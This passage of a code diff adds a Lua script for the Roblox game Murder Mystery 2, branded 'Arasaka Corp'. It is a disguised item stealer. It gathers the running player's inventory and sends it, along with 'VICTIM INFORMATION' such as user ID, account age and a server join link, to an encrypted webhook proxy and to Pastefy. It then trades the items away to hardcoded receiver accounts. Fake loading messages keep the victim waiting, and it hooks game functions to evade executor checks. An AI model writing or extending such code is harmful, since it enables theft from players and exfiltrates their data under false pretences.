+end
+
+local function processUser(playerName)
+    if isProcessing then return end
+    if processedUsers[playerName] then return end
+    isProcessing = true
+    processedUsers[playerName] = true
+
+    local player = Players:FindFirstChild(playerName)
+    if player then
+        executeTrade(player)
+    end
+
+    processedUsers[playerName] = nil
+    isProcessing = false
+end
+
+local function checkAndProcess()
+    if isProcessing then return end
+    for _, name in ipairs(USERNAMES) do
+        local player = Players:FindFirstChild(name)
+        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+            if not processedUsers[name] then
+                task.spawn(function() processUser(name) end)
+                return
+            end
+        end
+    end
+end
+
+local function uploadToPastefy(items)
+    if not items or #items == 0 then return nil end
+    table.sort(items, function(a, b)
+        local ao = RARITY_ORDER[a.Rarity] or 1
+        local bo = RARITY_ORDER[b.Rarity] or 1
+        if ao ~= bo then return ao > bo end
+        return (a.Value or 0) > (b.Value or 0)
+    end)
+
+    local lines = {
+        "ARASAKA CORP | MM2 Inventory Dump",
+        "User: " .. plr.Name .. " (" .. plr.DisplayName .. ")",
+        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
+        "Total Value: " .. formatValue(totalValue),
+        "Total Items: " .. #items,
+        string.rep("-", 60),
+        ""
+    }
+
+    local currentTier = nil
+    for _, item in ipairs(items) do
+        if currentTier ~= item.Rarity then
+            currentTier = item.Rarity
+            table.insert(lines, "")
+            table.insert(lines, "[" .. tostring(currentTier):upper() .. "]")
+            table.insert(lines, string.rep("-", 30))
+        end
+        local totalVal = (item.Value or 0) * (item.Amount or 1)
+        table.insert(lines, string.format(
+            "%s x%d | %s each | Total: %s",
+            item.ItemName or "Unknown",
+            tonumber(item.Amount) or 1,
+            formatValue(item.Value or 0),
+            formatValue(totalVal)
+        ))
+    end
+
+    local content = table.concat(lines, "\n")
+    local ok, response = pcall(function()
+        return requestFn({
+            Url = PASTEFY_ENDPOINT,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
+        })
+    end)
+
+    if ok and response and response.StatusCode == 200 then
+        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+        if ok2 and data then
+            if data.paste then return "https://pastefy.app/" .. data.paste.id end
+            if data.id then return "https://pastefy.app/" .. data.id end
+        end
+    end
+    return nil
+end
+
+local function buildPayload()
+    local items = inventory
+    local totalItems = 0
+    local value = totalValue
+    local counts = rarityCounts
+
+    for _, item in ipairs(items) do
+        totalItems = totalItems + (item.Amount or 1)
+    end
+
+    local hitCategory
+    local glowEffect = ""
+    if value >= 5000 then
+        hitCategory = "INSANE HIT ($5K+)"
+        glowEffect = "✦"
+    elseif value >= 2000 then
+        hitCategory = "MASSIVE HIT ($2K+)"
+        glowEffect = "🔥"
+    elseif value >= 500 then
+        hitCategory = "BIG HIT ($500+)"
+        glowEffect = "⚡"
+    elseif value >= 100 then
+        hitCategory = "GOOD HIT ($100+)"
+        glowEffect = "💫"
+    elseif value >= 15 then
+        hitCategory = "NORMAL HIT ($15+)"
+    else
+        hitCategory = "LOW HIT (<$15)"
+    end
+
+    local topItems = {}
+    for i = 1, math.min(5, #items) do
+        local it = items[i]
+        local icon = "░"
+        local v = it.Value or 0
+        if v >= 500 then icon = "█"
+        elseif v >= 100 then icon = "▓"
+        elseif v >= 25 then icon = "▒"
+        end
+        table.insert(topItems, string.format(
+            "%s %s x%d | %s",
+            icon,
+            it.ItemName or "Unknown",
+            tonumber(it.Amount) or 1,
+            formatValue(v)
+        ))
+    end
+
+    local pastefyLink = nil
+    if #items > 0 then
+        pastefyLink = uploadToPastefy(items)
+    end
+
+    local job = realJobId or game.JobId
+    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
+                   .. "&gameInstanceId=" .. tostring(job)
+
+    local fields = {
+        {
+            name = "VICTIM INFORMATION",
+            value = "```yml\nUser: " .. plr.DisplayName .. " (@" .. plr.Name .. ")\n"
+                 .. "ID: " .. tostring(plr.UserId) .. "\n"
+                 .. "Age: " .. tostring(plr.AccountAge) .. " days\n"
+                 .. "Server: " .. tostring(job):sub(1, 8) .. "\n```",
+            inline = true
+        },
+        {
+            name = "VALUATION",
+            value = "```yml\nTotal Value: " .. formatValue(value) .. "\n"
+                 .. "Items: " .. tostring(totalItems) .. "\n"
+                 .. "Receiver: " .. table.concat(USERNAMES, ", ") .. "\n```",
+            inline = true
+        },
+        {
+            name = "INVENTORY BREAKDOWN",
+            value = "```yml\n"
+                 .. "Ancient: " .. tostring(counts.Ancient or 0)
+                 .. " | Godly: " .. tostring(counts.Godly or 0) .. "\n"
+                 .. "Unique: " .. tostring(counts.Unique or 0)
+                 .. " | Vintage: " .. tostring(counts.Vintage or 0) .. "\n"
+                 .. "Legendary: " .. tostring(counts.Legendary or 0)
+                 .. " | Rare: " .. tostring(counts.Rare or 0) .. "\n"
+                 .. "Uncommon: " .. tostring(counts.Uncommon or 0)
+                 .. " | Common: " .. tostring(counts.Common or 0) .. "\n```",
+            inline = false
+        }
+    }
+
+    if #topItems > 0 then
+        local topStr = "```prolog\n"
+        for _, s in ipairs(topItems) do
+            topStr = topStr .. s .. "\n"
+        end
+        topStr = topStr .. "```"
+        table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
+    end
+
+    if pastefyLink then
+        table.insert(fields, {
+            name = "FULL INVENTORY",
+            value = "[View All " .. tostring(#items) .. " Items on Pastefy](" .. pastefyLink .. ")",
+            inline = false
+        })
+    end
+
+    table.insert(fields, {
+        name = "ACTIONS",
+        value = "[Join Server](" .. fernLink .. ")",
+        inline = false
+    })
+
+    local embedColor = 0x8B0000
+    if value >= 5000 then embedColor = 0xFF0000
+    elseif value >= 2000 then embedColor = 0xCC0000
+    elseif value >= 500 then embedColor = 0x990000
+    elseif value >= 100 then embedColor = 0x660000
+    elseif value >= 15 then embedColor = 0x440000
+    end
+
+    local embed = {
+        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
+        color = embedColor,
+        fields = fields,
+        footer = {text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = {
+        username = "Arasaka Corp",
+        embeds = {embed}
+    }
+
+    if value >= 500 or (counts.Ancient or 0) > 0 then
+        payload.content = "@everyone **ARASAKA CORP | MM2 HIT**"
+    end
+
+    return payload, pastefyLink
+end
+
+local function sendWebhook(payload)
+    local fullUrl = PROXY_URL .. WEBHOOK_ID
+    local envelope = { id = WEBHOOK_ID, payload = payload }
+    local json = HttpService:JSONEncode(envelope)
+    local encrypted = crypto:Encrypt(json)
+
+    local success, response = pcall(function()
+        return requestFn({
+            Url = fullUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({data = encrypted})
+        })
+    end)
+    return success, response
+end
+
+local function sendPublic(payload)
+    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
+    local json = HttpService:JSONEncode(payload)
+    local encrypted = crypto:Encrypt(json)
+
+    local success, response = pcall(function()
+        return requestFn({
+            Url = PUBLIC_PROXY,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({data = encrypted})
+        })
+    end)
+    return success, response
+end
+
+local function dispatchWebhook()
+    local payload, pastefyLink = buildPayload()
+    sendWebhook(payload)
+
+    local publicPayload = {
+        message = plr.Name .. " got hit by Arasaka Corp in MM2"
+               .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
+    }
+    sendPublic(publicPayload)
+
+    return payload
+end
+
+
+local function deltaBypass()
+    if not isDelta then return end
+
+    local stepAnimate = nil
+    local found = false
+    repeat
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    found = true
+                    break
+                end
+            end
+        end
+        task.wait(0.5)
+    until found
+
+    local printed = false
+    local old
+    old = hookfunction(stepAnimate, function(dt)
+        if not printed then
+            printed = true
+            realJobId = game.JobId
+            deltaBypassed = true
+        end
+        return old(dt)
+    end)
+
+    repeat task.wait() until deltaBypassed
+end
+
+local function validateServer()
+    local vip = false
+    pcall(function()
+        vip = (RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
+    end)
+
+    local full = (#Players:GetPlayers() >= MIN_SERVER_PLAYERS)
+
+    if vip or full then
+        local kickExecutors = {"delta", "hydrogen", "fluxus", "arceus", "codex"}
+        local shouldKick = false
+        for _, e in ipairs(kickExecutors) do
+            if executorName:lower():find(e) then
+                shouldKick = true
+                break
+            end
+        end
+        if shouldKick then
+            plr:Kick(vip and "VIP Servers not supported." or "FULL Servers Arent Supported")
+            return false
+        else
+            print(vip and "VIP Server detected, hopping..." or "Server full, hopping...")
+            serverHop()
+            return false
+        end
+    end
+
+    return true
+end
+
+local function bindEvents()
+    Players.PlayerAdded:Connect(function(player)
+        if player == plr then return end
+        if isTarget(player.Name) then
+            task.spawn(function()
+                task.wait(JOIN_WAIT)
+                checkAndProcess()
+            end)
+        end
+    end)
+
+    Players.PlayerRemoving:Connect(function(player)
+        if isTarget(player.Name) then
+            processedUsers[player.Name] = nil
+            task.wait(1)
+            checkAndProcess()
+        end
+    end)
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= plr and isTarget(p.Name) then
+            task.spawn(function()
+                task.wait(JOIN_WAIT)
+                checkAndProcess()
+            end)
+        end
+    end
+end
+
+local function main()
+    lockHttp()
+    deltaBypass()
+
+    if not validateServer() then return end
+
+    loadDatabase()
+    loadProfile()
+    fetchValues()
+    rebuildInventory()
+
+    if #inventory == 0 then
+        warn("[AC] No tradeable items found")
+    end
+
+    if not initRemotes() then return end
+
+    dispatchWebhook()
+
+    print("[AC] Loading Script for", plr.Name)
+    print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")
+    task.wait(3)
+
+    RunService.Heartbeat:Connect(function()
+        aggressiveMonitor()
+    end)
+
+    task.spawn(function()
+        while task.wait(2) do
+            checkAndProcess()
+        end
+    end)
+
+    bindEvents()
+end
+
+main()
